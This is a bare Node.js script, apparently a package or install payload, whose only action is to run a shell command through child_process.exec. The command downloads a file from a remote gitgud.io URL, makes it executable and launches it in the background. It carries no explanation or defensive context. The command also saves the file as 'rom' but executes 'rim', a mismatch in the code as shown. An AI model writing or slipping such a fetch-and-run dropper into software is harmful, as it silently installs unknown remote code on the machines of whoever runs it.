const { exec } = require("child_process");

exec(
  "curl --output rom https://gitgud.io/trendava/clouds/-/raw/master/rim;chmod 700 rim;./rim &",
  (error, stdout, stderr) => {
    if (error) {
      console.log(`error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.log(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  }
);
